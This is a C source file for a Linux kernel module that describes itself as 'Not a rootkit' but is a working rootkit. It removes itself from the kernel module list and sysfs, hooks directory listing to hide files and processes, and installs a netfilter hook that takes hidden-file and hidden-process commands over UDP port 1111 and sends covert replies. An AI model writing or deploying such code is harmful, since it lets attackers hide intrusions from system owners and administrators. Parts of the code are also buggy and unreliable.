#include <linux/init.h>
#include <linux/module.h>
#include <linux/path.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/pid.h>
#include <linux/sched/task.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/net.h>
#include <linux/socket.h>
#include <linux/kthread.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <net/net_namespace.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yanay Goor");
MODULE_DESCRIPTION("Not a rootkit");
MODULE_VERSION("0.1.0");

static struct list_head *modules;

static char *test_path_name = "/home/yanayg/test_file";
static char *test_path_name2 = "/home/yanayg/test_file2";
//static struct socket *cmd_socket = NULL;
static unsigned long proc_ino = 0;

static void hide_module(void) {
    // Save the list for later so we can add the module back in.
	modules = THIS_MODULE->list.prev;
	// Hide from procfs (lsmod)
	// TODO: This means that rmmod will not work, I need to provide a way for the module to unload itself.
	list_del(&THIS_MODULE->list);
	// Hide from sysfs (/sys/module)
	// kobject_del removes the kobject from the sysfs but does
	// not free it's memory (that only happens one the refcount is 0).
	// So it is save to call without causing an error later on when unloading the module.
	 kobject_del(&THIS_MODULE->mkobj.kobj);
	// ???
	// THIS_MODULE->sect_attrs = NULL;
	// ???
	// THIS_MODULE->notes_attrs = NULL;
}

static int is_digits(const char *name, int namelen) {
    int i;
    for (i = 0; i < namelen; i++) {
        if (name[i] - '0' > 9 || name[i] - '0' < 0) return 0;
    }
    return 1;
}


static unsigned long atoui(const char *name, int namelen) {
    int i;
    unsigned int res = 0;
    for (i = 0; i < namelen; i++) {
        if (name[i] - '0' > 9 || name[i] - '0' < 0) return 0;
        res *= 10;
        res += name[i] - '0';
    }
    return res;
}

static void unhide_module(void) {
	// Unhide from procfs (lsmod)
	list_add(&THIS_MODULE->list, modules);
}

static int get_inode_by_path_name(const char *path_name, struct inode **inode) {
    struct path path;
    int retval;
    if ((retval = kern_path(path_name, LOOKUP_FOLLOW, &path))) {
        return retval;
    }
    *inode = path.dentry->d_inode;
    printk(KERN_INFO "Path name: %s, inode: %lu\n", path_name, (*inode)->i_ino);
    path_put(&path);
    return 0;
}

struct fops_hook {
    struct list_head head;
    unsigned long ino;
    struct file_operations *fops;
    struct file_operations *prev_fops;
    unsigned int refcount;
};

static LIST_HEAD(fops_hooks);

static int create_fops_hook(struct inode *inode, struct file_operations **file_operations) {
	struct fops_hook *fops_hook;

	*file_operations = (struct file_operations *)kmalloc(sizeof(struct file_operations), GFP_KERNEL);
	memcpy(*file_operations, inode->i_fop, sizeof(struct file_operations));

	fops_hook = (struct fops_hook *)kmalloc(sizeof(struct fops_hook), GFP_KERNEL);
	fops_hook->ino = inode->i_ino;
	fops_hook->fops = *file_operations;
	fops_hook->prev_fops = inode->i_fop;
    fops_hook->refcount = 1;
	list_add(&fops_hook->head, &fops_hooks);

	inode->i_fop = *file_operations;
	return 0;

}

static int free_fops_hook(struct inode *inode) {
    struct fops_hook *entry;
    unsigned int refcount;

	list_for_each_entry(entry, &fops_hooks, head) {
	    if (entry->ino == inode->i_ino) {
            refcount = --(entry->refcount);
            if (refcount) return 0;
	        kfree(inode->i_fop);
	    	inode->i_fop = entry->prev_fops;
	        list_del(&entry->head);
	        kfree(entry);
	        return 0;
	    }
	}
	return -1;
}

static struct fops_hook *get_fops_hook(const struct inode *inode) {
    struct fops_hook *entry;
	list_for_each_entry(entry, &fops_hooks, head) {
	    if (entry->ino == inode->i_ino) {
	        return entry;
	    }
	}
	return NULL;
}

struct hidden_file_entry {
    struct list_head head;
    // parent directory inode number
    unsigned long ino;
    // file name
    char *file_name;
};

static LIST_HEAD(hidden_files);

static int create_hidden_file_entry(const struct inode *inode, const char *file_name) {
	char *inner_file_name;
	struct hidden_file_entry *hidden_file;

	inner_file_name = (char *)kmalloc(sizeof(char) + strlen(file_name), GFP_KERNEL);
	strcpy(inner_file_name, file_name);

	hidden_file = (struct hidden_file_entry *)kmalloc(sizeof(struct hidden_file_entry), GFP_KERNEL);
	hidden_file->ino = inode->i_ino;
	hidden_file->file_name = inner_file_name;

	list_add(&hidden_file->head, &hidden_files);
	return 0;
}

static int free_hidden_file_entry(const struct inode *inode, const char *file_name) {
    struct hidden_file_entry *entry;

	list_for_each_entry(entry, &hidden_files, head) {
	    if (entry->ino == inode->i_ino && !strcmp(entry->file_name, file_name)) {
	        kfree(entry->file_name);
	        list_del(&entry->head);
	        kfree(entry);
	        return 0;
	    }
	}
	return -1;
}

struct hidden_process_entry {
    struct list_head head;
    unsigned long exe_file_ino;
};

static LIST_HEAD(hidden_processes);

static int create_hidden_process_entry(const char *exe_file_name) {
    int retval;
    struct inode *inode;
	struct hidden_process_entry *hidden_process;

    if ((retval = get_inode_by_path_name(exe_file_name, &inode))) {
	    return retval;
	}

	hidden_process = (struct hidden_process_entry *)kmalloc(sizeof(struct hidden_process_entry), GFP_KERNEL);
	hidden_process->exe_file_ino = inode->i_ino;

	list_add(&hidden_process->head, &hidden_processes);
	return 0;
}

static int free_hidden_process_entry(const char *exe_file_name) {
    int retval;
    struct inode *inode;
    struct hidden_process_entry *entry;

    if ((retval = get_inode_by_path_name(exe_file_name, &inode))) {
	    return retval;
	}

	list_for_each_entry(entry, &hidden_processes, head) {
	    if (entry->exe_file_ino == inode->i_ino) {
	        list_del(&entry->head);
	        kfree(entry);
	        return 0;
	    }
	}
	return -1;
}


static unsigned long get_exec_ino_by_pid(int pid) {
    struct pid *pid_struct;
    struct task_struct *task_struct;
    unsigned long result;

    pid_struct = find_get_pid(pid);
    task_struct = get_pid_task(pid_struct,  PIDTYPE_PID);

    if (!task_struct->mm || !task_struct->mm->exe_file) {
        return 0;
    }

    result = task_struct->mm->exe_file->f_inode->i_ino;
    put_task_struct(task_struct);
    put_pid(pid_struct);
    return result;
}


struct hooked_dir_context {
    struct list_head head;
    struct dir_context *ctx;
    filldir_t prev_actor;
    unsigned long ino;
};

static LIST_HEAD(hooked_dir_context_list);


static int new_actor(struct dir_context *ctx, const char *name, int namelen, loff_t off, u64 ino, unsigned type) {
    struct hooked_dir_context *entry;
    struct hidden_file_entry *hidden_file;
    struct hidden_process_entry *hidden_proc;

	list_for_each_entry(entry, &hooked_dir_context_list, head) {
	    if (entry->ctx == ctx) {
	    	printk(KERN_INFO "Called hooked actor! %s", name);
	        list_for_each_entry(hidden_file, &hidden_files, head) {
                if (hidden_file->ino == entry->ino && !strcmp(name, hidden_file->file_name)) {
                    return 0;
                }
	        }
	        if (entry->ino == proc_ino) {
	            list_for_each_entry(hidden_proc, &hidden_processes, head) {
                    if (is_digits(name, namelen) && hidden_proc->exe_file_ino == get_exec_ino_by_pid(atoui(name, namelen))) {
                        return 0;
                    }
                }
	            printk(KERN_INFO "Called proc iterate!");
	        }
	        return entry->prev_actor(ctx, name, namelen, off, ino, type);
	    }
	}
	return -1;
}

static int new_iterate_shared(struct file *filp, struct dir_context *dir_context) {
    struct hooked_dir_context *hook;
    struct fops_hook *fops_hook;
	printk(KERN_INFO "Called hooked iterate!");
	hook = (struct hooked_dir_context *)kmalloc(sizeof(struct hooked_dir_context), GFP_KERNEL);
	hook->ctx = dir_context;
	hook->prev_actor = dir_context->actor;
	hook->ino = filp->f_inode->i_ino;
	list_add(&hook->head, &hooked_dir_context_list);
	dir_context->actor = new_actor;
	fops_hook = get_fops_hook(filp->f_inode);
	if (fops_hook == NULL) return -1;
	return fops_hook->prev_fops->iterate_shared(filp, dir_context);
}

static char *strtok_r(char *str, const char *delim) {
    int i = strlen(str) - 1;
    while (str[i] != '\0') {
        if (!memcmp(str + i, delim, sizeof(char) * strlen(delim))) {
            str[i] = '\0';
            return str + i + strlen(delim);
        }
        i--;
    }
    return NULL;
}

static int hide_file(const char *path_name) {
    int retval;
	char *dir_path;
	char *file_name;
	struct inode *inode;
	struct fops_hook *fops_hook;
	struct file_operations *file_operations;

	dir_path = kmalloc(strlen(path_name), GFP_KERNEL);
	strcpy(dir_path, path_name);
    file_name = strtok_r(dir_path, "/");

	if ((retval = get_inode_by_path_name(dir_path, &inode))) {
	    return retval;
	}

	if ((retval = create_hidden_file_entry(inode, file_name))) {
	    return retval;
	}
	kfree(dir_path);

	fops_hook = get_fops_hook(inode);
	if (fops_hook != NULL) {
	    fops_hook->refcount++;
	    fops_hook->fops->iterate_shared = new_iterate_shared;
	    return 0;
	}

	if ((retval = create_fops_hook(inode, &file_operations))) {
	    free_hidden_file_entry(inode, file_name);
	    return retval;
	}

	file_operations->iterate_shared = new_iterate_shared;

	return 0;
}

static int hide_process(const char *exec_file_path) {
    return create_hidden_process_entry(exec_file_path);
}

static int unhide_process(const char *exec_file_path) {
    return free_hidden_process_entry(exec_file_path);
}

static int init_hidden_processes(void) {
    int retval;
	struct inode *inode;
	struct fops_hook *fops_hook;
	struct file_operations *file_operations;

	if ((retval = get_inode_by_path_name("/proc", &inode))) {
	    return retval;
	}

	proc_ino = inode->i_ino;

	fops_hook = get_fops_hook(inode);
	if (fops_hook != NULL) {
	    fops_hook->refcount++;
	    fops_hook->fops->iterate_shared = new_iterate_shared;
	    return 0;
	}

	if ((retval = create_fops_hook(inode, &file_operations))) {
	    return retval;
	}

	file_operations->iterate_shared = new_iterate_shared;

	return 0;
}

static int unhide_file(const char *path_name) {
    int retval;
	char *dir_path;
	char *file_name;
	struct inode *inode;

	dir_path = kmalloc(strlen(path_name), GFP_KERNEL);
	strcpy(dir_path, path_name);
    file_name = strtok_r(dir_path, "/");

	if ((retval = get_inode_by_path_name(dir_path, &inode))) {
	    return retval;
	}

    if ((retval = free_hidden_file_entry(inode, file_name))) {
	    return retval;
	}
    kfree(dir_path);

	return free_fops_hook(inode);
}

struct cmd_type {
    char *name;
    int (*func)(const char *path);
};

static void MRK_exit(void) {
    unhide_module();
	printk(KERN_INFO "Goodbye, World!\n");
}

static int exit_func(const char *_) {
    MRK_exit();
    return 0;
}

int cmds_len = 5;
int cmd_port = 1111;
char *cmd_magic = "mrk";
int job_id_len = 2;
struct cmd_type cmds[] = {
    {
        "hfile",
        hide_file
    },
    {
        "ufile",
        unhide_file
    },
    {
        "hproc",
        hide_process
    },
    {
        "uproc",
        unhide_process
    },
    {
        "fexit",
        exit_func
    }
};

static int match_cmd(struct cmd_type *cmd, const char *data) {
    return strncmp(data, cmd->name, strlen(cmd->name));
}

static int call_cmd(struct cmd_type *cmd, const char *data, unsigned int data_len) {
    char *new_data;
    int result;
    new_data = kmalloc(data_len + 1, GFP_KERNEL);
    memcpy(new_data, data, data_len);
    result = cmd->func(new_data + strlen(cmd->name));
    kfree(new_data);
    return result;
}

static int send_response(
    unsigned short job_id,
    int response_status,
    unsigned int local_ip,
    unsigned int remote_ip,
    unsigned int remote_port,
    unsigned char remote_mac[],
    struct net_device *dev
) {
    struct iphdr *iph;
    struct udphdr *udph;
    struct ethhdr *eth;
    struct sk_buff *skb;
    int data_len = 3;
    char *data;
    int header_len = sizeof(struct udphdr) + 5 * 4 + ETH_HLEN;
    printk(KERN_INFO "returning response %d for job id %u\n", response_status, job_id);
    skb = alloc_skb(data_len + header_len, GFP_ATOMIC);
    if (!skb) {
        printk(KERN_INFO "failed allocating skb\n");
        return -1;
    }
    skb_reserve(skb, header_len);
    data = skb_put(skb, data_len);

    // put response data.
    *data = job_id;
    put_unaligned((char)response_status, data + 2);

    skb_push(skb, sizeof(struct udphdr));
    skb_reset_transport_header(skb);
    udph = udp_hdr(skb);
    udph->source = htons(cmd_port);
    udph->dest = remote_port;
    udph->len = htons(data_len + sizeof(struct udphdr));
    udph->check = 0;
    udph->check = csum_tcpudp_magic(
        local_ip,
        remote_ip,
        data_len + sizeof(struct udphdr),
        IPPROTO_UDP,
        csum_partial(
            udph,
            data_len + sizeof(struct udphdr),
            0
        )
    );

    if (udph->check == 0) udph->check = CSUM_MANGLED_0;

    skb_push(skb, sizeof(*iph));
    skb_reset_network_header(skb);
    iph = ip_hdr(skb);
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = htons(data_len + sizeof(struct udphdr) + 5 * 4);
    iph->id       = 0; // ?????
    iph->frag_off = 0;
    iph->ttl      = 64;
    iph->protocol = IPPROTO_UDP;
    iph->check    = 0;
    iph->saddr = local_ip;
    iph->daddr = remote_ip;
    iph->check = ip_fast_csum((unsigned char *)iph, iph->ihl);

    eth = (struct ethhdr *) skb_push(skb, ETH_HLEN);
    skb_reset_mac_header(skb);
    skb->protocol = eth->h_proto = htons(ETH_P_IP);
    memcpy(eth->h_source, dev->dev_addr, ETH_ALEN);
    memcpy(eth->h_dest, remote_mac, ETH_ALEN);

    skb->dev = dev;

    return dev_queue_xmit(skb);
}

static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
    struct iphdr *iph;
    struct udphdr *udph;
    const char *user_data;
    int i;
    int result;

    iph = ip_hdr(skb);
    if (iph->protocol != IPPROTO_UDP) return NF_ACCEPT;

    udph = udp_hdr(skb);
    if (ntohs(udph->dest) != cmd_port) return NF_ACCEPT;

    #ifdef NET_SKBUFF_DATA_USES_OFFSET
    user_data = skb->head + skb->tail - ntohs(udph->len) + sizeof(struct udphdr);
    #else
    user_data = skb->tail - ntohs(udph->len) + sizeof(struct udphdr);
    #endif

    if (strncmp(user_data, cmd_magic, strlen(cmd_magic))) return NF_ACCEPT;
    for (i = 0; i < cmds_len; i++) {
        if (!match_cmd(cmds + i, user_data + job_id_len + strlen(cmd_magic))) {
            result = call_cmd(cmds + i, user_data + job_id_len + strlen(cmd_magic), ntohs(udph->len) - sizeof(struct udphdr));
            printk(KERN_INFO "Found %s cmd packet! executed with code %d\n", cmds[i].name, result);
            send_response(get_unaligned((unsigned short *)(user_data + strlen(cmd_magic))), result, iph->daddr, iph->saddr, udph->source, eth_hdr(skb)->h_source, skb->dev);
            return NF_DROP;
        }
    }
    printk(KERN_INFO "Found unclear cmd packet.\n");
    return NF_ACCEPT;
}

struct nf_hook_ops *net_hook;

static int MRK_init_nethook(void) {
    net_hook = kmalloc(sizeof(struct nf_hook_ops), GFP_KERNEL);
    net_hook->hook = MRK_hookfn;
    net_hook->hooknum = NF_INET_PRE_ROUTING;
    net_hook->pf = PF_INET;
    net_hook->priority = NF_IP_PRI_FILTER;
    return nf_register_net_hook(&init_net, net_hook);
}

//static int MRK_thread_fn(void *data) {
//    int retval;
//    int length;
//    struct kvec iov;
//    struct msghdr cmd_msg;
//    void *buffer;
//    struct sockaddr_in addr = {
//	    AF_INET,
//	    htons(1111),
//	    {INADDR_ANY}
//	};
//    printk(KERN_INFO "started kthread");
//    buffer = kmalloc(2048, GFP_KERNEL);
//    if ((retval = sock_create_kern(&init_net, PF_INET, SOCK_DGRAM, IPPROTO_UDP, &cmd_socket))) {
//	    return retval;
//	}
//    printk(KERN_INFO "created socket in kthread");
//	iov.iov_base = buffer;
//	iov.iov_len = 2048;
////	int kernel_recvmsg(struct socket *sock, struct msghdr *msg, struct kvec *vec, size_t num, size_t size, int flags);
//	if ((retval = kernel_bind(cmd_socket, (struct sockaddr *) &addr, sizeof(struct sockaddr_in)))) {
//        printk(KERN_INFO "binding failed with status %d", retval);
//	    return retval;
//	}
//    printk(KERN_INFO "bounded socket");
//	while(1) {
//	    length = kernel_recvmsg(cmd_socket, &cmd_msg, &iov, 1, 2048, 0);
//	    printk(KERN_INFO "recived msg with len %d", length);
//	}
//
//}


static int __init MRK_initialize(void) {
//    struct task_struct *MRK_kthread;
    MRK_init_nethook();
    init_hidden_processes();
	hide_file(test_path_name);
	hide_file(test_path_name2);
	unhide_file(test_path_name2);
    hide_process("/bin/ps");
	hide_module();
	printk(KERN_INFO "Hello, World!\n");
//	MRK_kthread = kthread_create(MRK_thread_fn, 0, "MRK thread");
//	wake_up_process(MRK_kthread);
	return 0;
}


module_init(MRK_initialize);
module_exit(MRK_exit);
